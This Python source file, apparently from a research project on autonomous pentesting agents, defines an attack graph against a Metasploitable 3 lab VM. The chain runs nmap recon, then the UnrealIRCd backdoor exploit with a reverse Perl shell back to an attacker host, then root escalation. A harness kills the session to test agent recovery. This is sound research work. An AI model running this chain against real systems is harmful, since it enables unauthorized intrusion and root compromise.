"""
Example Attack Graph: ORPHAN-A — capability loss before privilege escalation (MS3).

This is the HEADLINE scenario of the GRAFT paper (experiment_plan.md 3.3). Unlike
the flaw_* graphs (which inject a WRONG MODULE so a technique fails), orphan-A is a
completely NORMAL, working chain — recon -> gain_access -> escalate — into which
the HARNESS destroys an already-established capability at a controlled point:

    the command-shell SESSION obtained at gain_access is killed EXTERNALLY,
    from the harness, right before the privilege-escalation node runs.

Why this scenario exists (capability orphaning, Eq. 6):
  escalate's precondition is "hold a live session on the target". Once that session
  is destroyed, RETRY cannot help — resampling the privesc technique leaves the
  world state unchanged, so the precondition stays unsatisfiable at every retry
  budget. The only repair is STRUCTURAL: synthesize a node that RE-PROVISIONS a
  fresh session (re-exploit) and RE-PARENT `escalate` onto it. That is the graft.

The injection is metadata only. The graph itself is a valid working chain; the
run harness reads `metadata["injection"]` and performs the external session kill
at the marked point (see the session-kill hook). Keeping the graph clean means the
SAME chain, minus the injection, is the no-fault control (smoke test T1).

Objective node: `escalate` (grounded on uid=0(root)). The lean design ends the
run at grounded privesc rather than walking on to persist/impact — the orphan-A
objective is "recover privesc after the session loss", so this both proves the
claim and roughly halves the run length.

Run with explore=True so the L3 repair (graft) is active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


# The node whose capability is destroyed, and the node that established it. Kept as
# module constants so the harness kill-hook and the offline tests agree on names.
KILL_BEFORE_NODE = "escalate"       # session is killed right before this runs
CAPABILITY_PROVIDER = "gain_access"  # the node that opened the session (so kappa in H)


def build_orphan_a_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667, then escalate to root. (This is "
                  "the orphan-A capability-loss scenario: the session obtained at "
                  "initial access is destroyed externally before privilege "
                  "escalation runs, so the objective can only be reached by "
                  "re-provisioning a fresh session and re-parenting privesc onto it.)",
        target_ip=target_ip,
        name=f"orphan_a_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Capability-loss (orphan) scenario: the access session is "
                    "killed externally before privesc — exercises the graft.",
        metadata={
            "scenario": "orphan_a",
            "target_type": "metasploitable3",
            # The injection contract the run harness reads. type distinguishes a
            # capability loss (graft) from a technique failure (substitute); the
            # kill hook destroys `capability` right before `kill_before_node`.
            "injection": {
                "type": "capability_loss",
                "capability": "session",
                "kill_before_node": KILL_BEFORE_NODE,
                "provided_by_node": CAPABILITY_PROVIDER,
                "stage": "privilege_escalation",
            },
        },
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # WORKING proven lander: UnrealIRCd 3.2.8.1 backdoor on 6667 -> command shell.
    # This is the node that ESTABLISHES the session capability (later destroyed).
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a command shell session on the target",
        objective=f"Gain an initial command shell on {target_ip} via the "
                  f"UnrealIRCd 3.2.8.1 backdoor on port 6667. LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={"RHOSTS": target_ip, "RPORT": 6667},
        payload="cmd/unix/reverse_perl",
        payload_options={"LHOST": attacker_ip, "LPORT": 4464},
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    # THE OBJECTIVE: escalate to root over the session. No prescribed module — the
    # privesc subagent runs the MS3 kernel path (overlayfs / DirtyCow). Its
    # precondition is a LIVE session; when the harness kills the session before this
    # node, the feasibility gate fails with a missing `session` capability, the
    # classifier calls it a capability loss, and the graft re-provisions + re-parents.
    graph.add_node(AttackNode(
        id="escalate",
        label="Escalate to Root",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1068",
        technique_name="Exploitation for Privilege Escalation",
        agent_type="privesc",
        goal="Escalate the session to root (uid=0)",
        objective="Escalate privileges on the target to root over the existing "
                  "session and prove it with uid=0(root) from id/getuid.",
        target_ip=target_ip,
        tool_name="metasploit",
        max_retries=2,
        tags=["privesc", "objective"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access via the UnrealIRCd backdoor",
    )
    # This edge carries the SESSION capability from gain_access to escalate. When
    # the harness destroys the session, escalate's precondition (this capability)
    # is no longer held -> capability orphaning.
    graph.connect(
        "gain_access", "escalate",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A live session is required to escalate")],
        evidence="Initial session established",
        rationale="Escalate privileges over the session",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_orphan_a_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/orphan_a_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
